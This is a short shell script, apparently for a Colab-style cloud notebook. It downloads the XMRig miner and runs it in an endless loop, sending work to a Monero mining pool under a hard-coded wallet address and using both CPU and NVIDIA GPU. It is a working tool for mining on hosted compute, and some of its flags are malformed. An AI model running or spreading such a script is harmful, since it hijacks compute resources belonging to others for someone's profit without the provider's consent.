sudo apt update && sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-x64.tar.gz
tar -xzvf xmrig-6.13.1-linux-x64.tar.gz
while [ 1 ]; do
cp /usr/lib64-nvidia/libOpenCL.so /content/xmrig-6.13.1/
cd xmrig-6.13.1 && ./xmrig -a rx/0 -o gulf.moneroocean.stream:10001 -u 89FrFfGZXbEPRvbYWVBQpmPNH182GpkZdUdhdnDpcwfaCRL8kgc8GKkTsGQ7gG3vpmJdEubR23wLGaVVY43PUQvWVenczrm -p CPU-MT_RECEH-$(echo $(shuf -i 1-999 -n 1)) --pVaperS --t 8 --opencl --opencl --opencl-platform NVIDIA
sleep 2
done
sleep 999
